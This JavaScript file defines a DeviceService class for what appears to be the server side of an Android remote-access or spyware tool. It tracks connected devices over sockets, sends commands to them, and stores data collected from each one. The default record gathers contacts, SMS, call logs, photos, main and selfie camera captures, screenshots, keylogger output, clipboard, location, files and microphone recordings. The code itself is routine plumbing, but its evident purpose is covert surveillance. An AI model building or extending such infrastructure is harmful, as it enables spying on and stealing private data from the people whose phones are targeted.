/**
 * Device service - Business logic for device operations
 */

const logger = require('../utils/logger');
const { NotFoundError } = require('../utils/errors');
const { detectFromDeviceInfo, normalizePlatform } = require('../utils/platformDetector');

class DeviceService {
  constructor(deviceRepository, deviceDataRepository, io) {
    this.deviceRepository = deviceRepository;
    this.deviceDataRepository = deviceDataRepository;
    this.io = io;
  }

  /**
   * Get all devices
   * @param {Object} filters - Optional filters (platform, online)
   */
  async getAllDevices(filters = {}) {
    try {
      const devices = await this.deviceRepository.findAll(filters);
      const deviceList = [];

      for (const device of devices) {
        const isOnline = this.io && this.io.sockets && this.io.sockets.sockets ? this.io.sockets.sockets.has(device.id) : false;
        deviceList.push({
          id: device.id,
          model: device.model,
          version: device.version,
          ip: device.ip,
          platform: device.platform || 'android',
          platformVersion: device.platformVersion || null,
          connectedAt: device.connectedAt,
          online: isOnline,
        });
      }

      return deviceList;
    } catch (error) {
      logger.error('Error getting all devices:', error);
      throw error;
    }
  }

  /**
   * Get device by ID
   */
  async getDeviceById(deviceId) {
    try {
      const device = await this.deviceRepository.findById(deviceId);
      
      if (!device) {
        throw new NotFoundError('Device');
      }

      const data = await this.deviceDataRepository.findByDeviceId(deviceId);
      const isOnline = this.io && this.io.sockets && this.io.sockets.sockets ? this.io.sockets.sockets.has(deviceId) : false;

      return {
        info: {
          id: device.id,
          model: device.model,
          version: device.version,
          ip: device.ip,
          platform: device.platform || 'android',
          platformVersion: device.platformVersion || null,
          connectedAt: device.connectedAt,
          online: isOnline,
        },
        data: data || {},
      };
    } catch (error) {
      logger.error(`Error getting device ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Create or update device
   * @param {string} deviceId - Device ID
   * @param {Object} deviceInfo - Device information
   */
  async createOrUpdateDevice(deviceId, deviceInfo) {
    try {
      // Detect platform if not provided
      if (!deviceInfo.platform) {
        deviceInfo.platform = detectFromDeviceInfo(deviceInfo);
      } else {
        deviceInfo.platform = normalizePlatform(deviceInfo.platform);
      }

      const existingDevice = await this.deviceRepository.findById(deviceId);
      
      if (existingDevice) {
        return await this.deviceRepository.update(deviceId, {
          ...deviceInfo,
          updatedAt: new Date().toISOString(),
        });
      }

      return await this.deviceRepository.create({
        id: deviceId,
        ...deviceInfo,
        platform: deviceInfo.platform || 'android',
        connectedAt: new Date().toISOString(),
      });
    } catch (error) {
      logger.error(`Error creating/updating device ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Initialize device data
   */
  async initDeviceData(deviceId) {
    try {
      const existingData = await this.deviceDataRepository.findByDeviceId(deviceId);
      
      if (existingData) {
        return existingData;
      }

      const defaultData = {
        deviceId,
        contacts: [],
        sms: [],
        calls: [],
        gallery: [],
        camera: {
          main: [],
          selfie: [],
        },
        screenshots: [],
        keylogger: {
          enabled: false,
          data: [],
        },
        clipboard: '',
        location: null,
        apps: [],
        files: [],
        microphone: [],
        audio: {
          playing: false,
          current: null,
        },
      };

      return await this.deviceDataRepository.create(defaultData);
    } catch (error) {
      logger.error(`Error initializing device data ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Update device data
   */
  async updateDeviceData(deviceId, type, payload) {
    try {
      const data = await this.deviceDataRepository.findByDeviceId(deviceId);
      
      if (!data) {
        await this.initDeviceData(deviceId);
      }

      return await this.deviceDataRepository.updateByType(deviceId, type, payload);
    } catch (error) {
      logger.error(`Error updating device data ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Update device data from command response
   */
  async updateDeviceDataFromResponse(deviceId, request, result) {
    try {
      return await this.deviceDataRepository.updateFromResponse(deviceId, request, result);
    } catch (error) {
      logger.error(`Error updating device data from response ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Check if device is connected
   */
  isDeviceConnected(deviceId) {
    return this.io && this.io.sockets && this.io.sockets.sockets && this.io.sockets.sockets.has(deviceId);
  }

  /**
   * Emit event to device
   */
  emitToDevice(deviceId, event, data) {
    if (this.io && this.io.to) {
      const target = this.io.to(deviceId);
      if (target && target.emit) {
        target.emit(event, data);
      }
    }
  }

  /**
   * Broadcast event to all clients
   */
  broadcast(event, data) {
    if (this.io && this.io.emit) {
      this.io.emit(event, data);
    }
  }
}

module.exports = DeviceService;

